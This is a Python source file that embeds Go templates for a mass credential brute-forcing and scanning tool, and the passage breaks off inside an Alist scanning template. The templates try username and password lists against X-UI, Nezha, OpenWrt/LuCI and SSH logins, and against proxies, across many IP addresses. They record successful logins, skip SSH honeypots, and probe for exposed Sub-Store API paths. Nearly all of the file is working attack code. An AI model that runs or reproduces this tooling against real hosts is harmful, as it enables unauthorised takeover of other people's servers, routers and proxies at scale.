# -*- coding: utf-8 -*-
import os
import subprocess
import time
import shutil
import sys
import atexit
import re
import json
import base64
import binascii
import importlib.util # 修复导入错误所需
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== 依赖导入强化 ====================
# 在脚本最开始就强制检查核心依赖，如果失败则直接退出
try:
    import psutil
    import requests
    import yaml
    from openpyxl import Workbook, load_workbook
    from tqdm import tqdm
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError as e:
    print("❌ 错误：核心 Python 模块缺失！")
    print(f"缺失的模块是: {e.name}")
    print("请先手动安装所有依赖：")
    print("python3 -m pip install psutil requests pyyaml openpyxl tqdm colorama")
    sys.exit(1)

try:
    import readline
except ImportError:
    pass
# =================================================

# ==================== 全局变量 ====================
TIMEOUT = 5
VERBOSE_DEBUG = False # 设置为True可以打印更详细的调试日志

# =========================== Go 模板 ===========================
# 为防止BOM字符问题，所有Go模板都重写为行列表

# XUI/3x-ui 面板登录模板
XUI_GO_TEMPLATE_1_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"encoding/json\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "// worker 函数从任务通道接收IP，并交由 processIP 处理",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	// 创建可复用的 HTTP客户端, 跳过TLS验证并禁用长连接以提高性能",
    "	tr := &http.Transport{",
    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives: true,",
    "	}",
    "	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	for line := range tasks {",
    "		processIP(line, file, usernames, passwords, httpClient)",
    "	}",
    "}",
    "// processIP 针对单个IP，尝试所有用户名和密码组合进行登录",
    "func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {",
    "	var ipPort string",
    "	// 尝试从完整的URL中解析出 'ip:port'",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" {",
    "		ipPort = u.Host",
    "	} else {",
    "		ipPort = strings.TrimSpace(line)",
    "	}",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return } // 如果格式不正确则跳过",
    "	ip, port := parts[0], parts[1]",
    "	// 遍历所有用户名和密码",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			var resp *http.Response",
    "			var err error",
    "			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "			// 1. 尝试 HTTP 登录",
    "			checkURLHttp := fmt.Sprintf(\"http://%s:%s/login\", ip, port)",
    "			payloadHttp := fmt.Sprintf(\"username=%s&password=%s\", username, password)",
    "			reqHttp, _ := http.NewRequestWithContext(ctx, \"POST\", checkURLHttp, strings.NewReader(payloadHttp))",
    "			reqHttp.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "			resp, err = httpClient.Do(reqHttp)",
    "			cancel()",
    "			// 2. 如果 HTTP 失败, 尝试 HTTPS 登录",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "				checkURLHttps := fmt.Sprintf(\"https://%s:%s/login\", ip, port)",
    "				payloadHttps := fmt.Sprintf(\"username=%s&password=%s\", username, password)",
    "				reqHttps, _ := http.NewRequestWithContext(ctx2, \"POST\", checkURLHttps, strings.NewReader(payloadHttps))",
    "				reqHttps.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "				resp, err = httpClient.Do(reqHttps)",
    "				cancel2()",
    "			}",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				continue // 如果两种协议都失败，则尝试下一个密码",
    "			}",
    "			// 检查响应状态码是否为200 OK",
    "			if resp.StatusCode == http.StatusOK {",
    "				body, readErr := io.ReadAll(resp.Body)",
    "				if readErr == nil {",
    "					var responseData map[string]interface{}",
    "					// 解析JSON响应并检查 'success' 字段",
    "					if json.Unmarshal(body, &responseData) == nil {",
    "						if success, ok := responseData[\"success\"].(bool); ok && success {",
    "							// 登录成功, 写入结果并立即返回",
    "							file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
    "							resp.Body.Close()",
    "							return",
    "						}",
    "					}",
    "				}",
    "			}",
    "			// 丢弃响应体以重用连接",
    "			io.Copy(io.Discard, resp.Body)",
    "			resp.Body.Close()",
    "		}",
    "	}",
    "}",
    "// main 函数是程序的入口，负责读取文件和初始化并发任务",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil {",
    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
    "		return",
    "	}",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	// 用户名和密码列表由Python脚本填充",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	if len(usernames) == 0 || len(passwords) == 0 {",
    "		fmt.Println(\"错误：用户名或密码列表为空。\")",
    "		return",
    "	}",
    "	// 创建带缓冲的任务通道",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	// 启动指定数量的 worker goroutine",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, usernames, passwords)",
    "	}",
    "	// 逐行读取输入文件并将任务发送到通道",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks) // 关闭通道，通知 worker 任务已结束",
    "	wg.Wait() // 等待所有 worker 完成",
    "}",
]

# 哪吒面板登录模板
XUI_GO_TEMPLATE_2_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"encoding/json\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	tr := &http.Transport{",
    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives: true,",
    "	}",
    "	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	for line := range tasks {",
    "		processIP(line, file, usernames, passwords, httpClient)",
    "	}",
    "}",
    "func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" {",
    "		ipPort = u.Host",
    "	} else {",
    "		ipPort = strings.TrimSpace(line)",
    "	}",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return }",
    "	ip, port := parts[0], parts[1]",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			var resp *http.Response",
    "			var err error",
    "			data := map[string]string{\"username\": username, \"password\": password}",
    "			jsonPayload, _ := json.Marshal(data)",
    "			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "			checkURLHttp := fmt.Sprintf(\"http://%s:%s/api/v1/login\", ip, port)",
    "			reqHttp, _ := http.NewRequestWithContext(ctx, \"POST\", checkURLHttp, strings.NewReader(string(jsonPayload)))",
    "			reqHttp.Header.Set(\"Content-Type\", \"application/json\")",
    "			resp, err = httpClient.Do(reqHttp)",
    "			cancel()",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "				checkURLHttps := fmt.Sprintf(\"https://%s:%s/api/v1/login\", ip, port)",
    "				reqHttps, _ := http.NewRequestWithContext(ctx2, \"POST\", checkURLHttps, strings.NewReader(string(jsonPayload)))",
    "				reqHttps.Header.Set(\"Content-Type\", \"application/json\")",
    "				resp, err = httpClient.Do(reqHttps)",
    "				cancel2()",
    "			}",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				continue",
    "			}",
    "			if resp.StatusCode == http.StatusOK {",
    "				body, readErr := io.ReadAll(resp.Body)",
    "				if readErr == nil {",
    "					var responseData map[string]interface{}",
    "					if json.Unmarshal(body, &responseData) == nil {",
    "						if data, ok := responseData[\"data\"].(map[string]interface{}); ok {",
    "							if _, tokenExists := data[\"token\"]; tokenExists {",
    "								file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
    "								resp.Body.Close()",
    "								return",
    "							}",
    "						}",
    "					}",
    "				}",
    "			}",
    "			io.Copy(io.Discard, resp.Body)",
    "			resp.Body.Close()",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil {",
    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
    "		return",
    "	}",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "    if len(usernames) == 0 || len(passwords) == 0 {",
    "        fmt.Println(\"错误：用户名或密码列表为空。\")",
    "        return",
    "    }",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

# SSH 登录模板
XUI_GO_TEMPLATE_6_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"fmt\"",
    "	\"log\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"golang.org/x/crypto/ssh\"",
    ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	for line := range tasks {",
    "		processIP(line, file, usernames, passwords)",
    "	}",
    "}",
    "func processIP(line string, file *os.File, usernames []string, passwords []string) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" {",
    "		ipPort = u.Host",
    "	} else {",
    "		ipPort = strings.TrimSpace(line)",
    "	}",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return }",
    "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
    "   log.Printf(\"Scanning SSH: %s:%s\", ip, port)",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			client, success, _ := trySSH(ip, port, username, password)",
    "			if success {",
    "				if !isLikelyHoneypot(client) {",
    "					file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
    "				}",
    "				client.Close()",
    "				return",
    "			}",
    "		}",
    "	}",
    "}",
    "func trySSH(ip, port, username, password string) (*ssh.Client, bool, error) {",
    "	addr := fmt.Sprintf(\"%s:%s\", ip, port)",
    "	config := &ssh.ClientConfig{",
    "		User:            username,",
    "		Auth:            []ssh.AuthMethod{ssh.Password(password)},",
    "		HostKeyCallback: ssh.InsecureIgnoreHostKey(),",
    "		Timeout:         {timeout} * time.Second,",
    "	}",
    "	client, err := ssh.Dial(\"tcp\", addr, config)",
    "    return client, err == nil, err",
    "}",
    "func isLikelyHoneypot(client *ssh.Client) bool {",
    "	session, err := client.NewSession()",
    "	if err != nil { return true }",
    "	defer session.Close()",
    "	err = session.RequestPty(\"xterm\", 80, 40, ssh.TerminalModes{})",
    "	if err != nil { return true }",
    "	output, err := session.CombinedOutput(\"echo $((1+1))\")",
    "	if err != nil { return true }",
    "	return strings.TrimSpace(string(output)) != \"2\"",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil {",
    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
    "		return",
    "	}",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

# Sub Store 路径扫描模板
XUI_GO_TEMPLATE_7_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, paths []string) {",
    "	defer wg.Done()",
    "	tr := &http.Transport{",
    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives: true,",
    "	}",
    "	client := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	for line := range tasks {",
    "		processIP(line, file, paths, client)",
    "	}",
    "}",
    "func processIP(line string, file *os.File, paths []string, client *http.Client) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" {",
    "		ipPort = u.Host",
    "	} else {",
    "		ipPort = strings.TrimSpace(line)",
    "	}",
    "	for _, path := range paths {",
    "		if tryBothProtocols(ipPort, path, client, file) { break }",
    "	}",
    "}",
    "func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.File) bool {",
    "	cleanPath := strings.Trim(path, \"/\")",
    "	fullPath := cleanPath + \"/api/utils/env\"",
    "	if success, _ := sendRequest(client, fmt.Sprintf(\"http://%s/%s\", ipPort, fullPath)); success {",
    "		file.WriteString(fmt.Sprintf(\"http://%s?api=http://%s/%s\\n\", ipPort, ipPort, cleanPath))",
    "		return true",
    "	}",
    "	if success, _ := sendRequest(client, fmt.Sprintf(\"https://%s/%s\", ipPort, fullPath)); success {",
    "		file.WriteString(fmt.Sprintf(\"https://%s?api=https://%s/%s\\n\", ipPort, ipPort, cleanPath))",
    "		return true",
    "	}",
    "	return false",
    "}",
    "func sendRequest(client *http.Client, fullURL string) (bool, error) {",
    "	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "	defer cancel()",
    "	req, err := http.NewRequestWithContext(ctx, \"GET\", fullURL, nil)",
    "	if err != nil { return false, err }",
    "	resp, err := client.Do(req)",
    "	if err != nil { ",
    "        if resp != nil { resp.Body.Close() }",
    "        return false, err ",
    "    }",
    "	defer resp.Body.Close()",
    "	if resp.StatusCode == http.StatusOK {",
    "		bodyBytes, readErr := io.ReadAll(resp.Body)",
    "		if readErr != nil { return false, readErr }",
    "		if strings.Contains(string(bodyBytes), `{\"status\":\"success\",\"data\"`) {",
    "			return true, nil",
    "		}",
    "	}",
    "	io.Copy(io.Discard, resp.Body)",
    "	return false, nil",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil {",
    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
    "		return",
    "	}",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	paths := {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, paths)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

# OpenWrt/iStoreOS 登录模板
XUI_GO_TEMPLATE_8_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	client := &http.Client{",
    "		Transport: &http.Transport{",
    "			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "			DisableKeepAlives: true,",
    "		},",
    "		Timeout: {timeout} * time.Second,",
    "		CheckRedirect: func(req *http.Request, via []*http.Request) error {",
    "			return http.ErrUseLastResponse",
    "		},",
    "	}",
    "	for line := range tasks {",
    "		processIP(line, file, usernames, passwords, client)",
    "	}",
    "}",
    "func processIP(line string, file *os.File, usernames []string, passwords []string, client *http.Client) {",
    "	targets := []string{}",
    "	trimmed := strings.TrimSpace(line)",
    "	if strings.HasPrefix(trimmed, \"http\") {",
    "		targets = append(targets, trimmed)",
    "	} else {",
    "		targets = append(targets, \"http://\"+trimmed, \"https://\"+trimmed)",
    "	}",
    "	for _, target := range targets {",
    "		u, err := url.Parse(target)",
    "		if err != nil { continue }",
    "		origin := u.Scheme + \"://\" + u.Host",
    "		referer := origin + \"/\"",
    "		for _, username := range usernames {",
    "			for _, password := range passwords {",
    "				if checkLogin(target, username, password, origin, referer, client) {",
    "					file.WriteString(fmt.Sprintf(\"%s %s %s\\n\", target, username, password))",
    "					return",
    "				}",
    "			}",
    "		}",
    "	}",
    "}",
    "func checkLogin(urlStr, username, password, origin, referer string, client *http.Client) bool {",
    "	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "	defer cancel()",
    "	payload := fmt.Sprintf(\"luci_username=%s&luci_password=%s\", username, password)",
    "	req, err := http.NewRequestWithContext(ctx, \"POST\", urlStr, strings.NewReader(payload))",
    "	if err != nil { return false }",
    "	req.Header.Set(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "	req.Header.Set(\"Origin\", origin)",
    "	req.Header.Set(\"Referer\", referer)",
    "	resp, err := client.Do(req)",
    "	if err != nil { ",
    "        if resp != nil { resp.Body.Close() }",
    "        return false ",
    "    }",
    "	defer resp.Body.Close()",
    "	io.Copy(io.Discard, resp.Body)",
    "	for _, c := range resp.Cookies() {",
    "		if c.Name == \"sysauth_http\" && c.Value != \"\" {",
    "			return true",
    "		}",
    "	}",
    "	return false",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil {",
    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
    "		return",
    "	}",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

# 通用代理验证模板
PROXY_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"io/ioutil\"",
    "	\"net\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"golang.org/x/net/proxy\"",
    ")",
    "var (",
    "	proxyType    = \"{proxy_type}\"",
    "	authMode     = {auth_mode}",
    "	testURL      = \"http://myip.ipip.net\"",
    "	realIP       = \"\"",
    ")",
    "func worker(tasks <-chan string, outputFile *os.File, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	for proxyAddr := range tasks {",
    "		processProxy(proxyAddr, outputFile)",
    "	}",
    "}",
    "func processProxy(proxyAddr string, outputFile *os.File) {",
    "	var found bool",
    "	checkAndFormat := func(auth *proxy.Auth) {",
    "        if found { return }",
    "		success, _ := checkConnection(proxyAddr, auth)",
    "		if success {",
    "            found = true",
    "			var result string",
    "			if auth != nil && auth.User != \"\" {",
    "				result = fmt.Sprintf(\"%s://%s:%s@%s\", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)",
    "			} else {",
    "				result = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr)",
    "			}",
    "			outputFile.WriteString(result + \"\\n\")",
    "		}",
    "	}",
    "	switch authMode {",
    "	case 1:",
    "		checkAndFormat(nil)",
    "	case 2:",
    "		usernames := {user_list}",
    "		passwords := {pass_list}",
    "		for _, user := range usernames {",
    "			for _, pass := range passwords {",
    "				if found { return }",
    "				auth := &proxy.Auth{User: user, Password: pass}",
    "				checkAndFormat(auth)",
    "			}",
    "		}",
    "	case 3:",
    "		credentials := {creds_list}",
    "		for _, cred := range credentials {",
    "			if found { return }",
    "			parts := strings.SplitN(cred, \":\", 2)",
    "			if len(parts) == 2 {",
    "				auth := &proxy.Auth{User: parts[0], Password: parts[1]}",
    "				checkAndFormat(auth)",
    "			}",
    "		}",
    "	}",
    "}",
    "func getPublicIP(targetURL string) (string, error) {",
    "	client := &http.Client{Timeout: 15 * time.Second}",
    "	req, err := http.NewRequest(\"GET\", targetURL, nil)",
    "	if err != nil { return \"\", err }",
    "	req.Header.Set(\"User-Agent\", \"curl/7.79.1\")",
    "	resp, err := client.Do(req)",
    "	if err != nil { return \"\", err }",
    "	defer resp.Body.Close()",
    "	body, err := ioutil.ReadAll(resp.Body)",
    "	if err != nil { return \"\", err }",
    "	ipString := string(body)",
    "	if strings.Contains(ipString, \"当前 IP：\") {",
    "		parts := strings.Split(ipString, \"：\")",
    "		if len(parts) > 1 {",
    "			ipParts := strings.Split(parts[1], \" \")",
    "			return ipParts[0], nil",
    "		}",
    "	}",
    "	return strings.TrimSpace(ipString), nil",
    "}",
    "func checkConnection(proxyAddr string, auth *proxy.Auth) (bool, error) {",
    "	transport := &http.Transport{ ",
    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives: true,",
    "	}",
    "	timeout := {timeout} * time.Second",
    "	if proxyType == \"http\" || proxyType == \"https\" {",
    "		var proxyURLString string",
    "		if auth != nil && auth.User != \"\" {",
    "			proxyURLString = fmt.Sprintf(\"%s://%s:%s@%s\", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)",
    "		} else {",
    "			proxyURLString = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr)",
    "		}",
    "		proxyURL, err := url.Parse(proxyURLString)",
    "		if err != nil { return false, err }",
    "		transport.Proxy = http.ProxyURL(proxyURL)",
    "       if proxyType == \"https\" {",
    "           transport.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {",
    "               dialer := &net.Dialer{Timeout: timeout}",
    "               return tls.DialWithDialer(dialer, network, proxyAddr, &tls.Config{InsecureSkipVerify: true})",
    "           }",
    "       }",
    "	} else {",
    "		dialer, err := proxy.SOCKS5(\"tcp\", proxyAddr, auth, &net.Dialer{",
    "			Timeout:   timeout,",
    "			KeepAlive: 30 * time.Second,",
    "		})",
    "		if err != nil { return false, err }",
    "		transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {",
    "			return dialer.Dial(network, addr)",
    "		}",
    "	}",
    "	httpClient := &http.Client{ Transport: transport, Timeout: timeout }",
    "	req, err := http.NewRequest(\"GET\", testURL, nil)",
    "	if err != nil { return false, err }",
    "	req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\")",
    "	resp, err := httpClient.Do(req)",
    "	if err != nil { ",
    "        if resp != nil { resp.Body.Close() }",
    "        return false, err ",
    "    }",
    "	defer resp.Body.Close()",
    "	body, readErr := ioutil.ReadAll(resp.Body)",
    "	if readErr != nil { return false, fmt.Errorf(\"无法读取响应\") }",
    "	proxyIP := string(body)",
    "	if strings.Contains(proxyIP, \"当前 IP：\") {",
    "		parts := strings.Split(proxyIP, \"：\")",
    "		if len(parts) > 1 {",
    "			ipParts := strings.Split(parts[1], \" \")",
    "			proxyIP = ipParts[0]",
    "		}",
    "	}",
    "	proxyIP = strings.TrimSpace(proxyIP)",
    "	if realIP == \"UNKNOWN\" || proxyIP == \"\" { return false, fmt.Errorf(\"无法获取IP验证\") }",
    "	if proxyIP == realIP { return false, fmt.Errorf(\"透明代理\") }",
    "	return true, nil",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	var err error",
    "	realIP, err = getPublicIP(testURL)",
    "	if err != nil {",
    "		realIP = \"UNKNOWN\"",
    "	}",
    "	proxies, err := os.Open(inputFile)",
    "	if err != nil {",
    "		return",
    "	}",
    "	defer proxies.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg)",
    "	}",
    "	scanner := bufio.NewScanner(proxies)",
    "	for scanner.Scan() {",
    "		proxyAddr := strings.TrimSpace(scanner.Text())",
    "		if proxyAddr != \"\" { tasks <- proxyAddr }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]
# Alist 面板扫描模板
ALIST_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"encoding/json\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net\"",
    "	\"net/http\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func createHttpClient() *http.Client {",
    "	tr := &http.Transport{",
    "		Proxy: http.ProxyFromEnvironment,",
    "		DialContext: (&net.Dialer{",
    "			Timeout:   {timeout} * time.Second,",
    "			KeepAlive: 0,",
    "		}).DialContext,",
    "		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},",
    "		TLSHandshakeTimeout:   {timeout} * time.Second,",
    "		ResponseHeaderTimeout: {timeout} * time.Second,",
    "		ExpectContinueTimeout: 1 * time.Second,",
    "		ForceAttemptHTTP2:     false,",
    "		DisableKeepAlives: true,",
    "	}",
    "	return &http.Client{",
    "		Transport: tr,",
    "		Timeout:   ({timeout} + 1) * time.Second,",
    "	}",
    "}",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	httpClient := createHttpClient()",
    "	for ipPort := range tasks {",
    "		processIP(ipPort, file, httpClient)",
    "	}",
    "}",
    "func processIP(ipPort string, file *os.File, httpClient *http.Client) {",
    "	parts := strings.SplitN(ipPort, \":\", 2)",
    "	if len(parts) != 2 { return }",
    "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
    "	for _, proto := range []string{\"http\", \"https\"} {",
